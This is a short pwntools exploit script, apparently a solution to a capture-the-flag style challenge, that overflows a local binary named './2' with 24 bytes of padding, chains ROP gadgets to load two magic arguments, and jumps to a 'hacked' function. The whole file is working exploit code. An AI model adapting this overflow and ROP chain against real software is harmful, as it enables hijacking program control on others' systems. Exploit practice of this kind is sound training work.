from pwn import *
# param1 = 0xDEADBEEFDEADBEEF
# param2 = 0xC0DEBABEC0DEBABE

elf = ELF("./2")

buff = b"A"*24
buff += p64(0x000000000040124b)#pop_rdi
buff += p64(0xDEADBEEFDEADBEEF)
buff += p64(0x0000000000401249) #pop_rsi_r15
buff += p64(0xC0DEBABEC0DEBABE)
buff += b"A"*8
buff+= p64(elf.symbols["hacked"])

p = elf.process()


p.recvline()

p.sendline(buff)

p.interactive()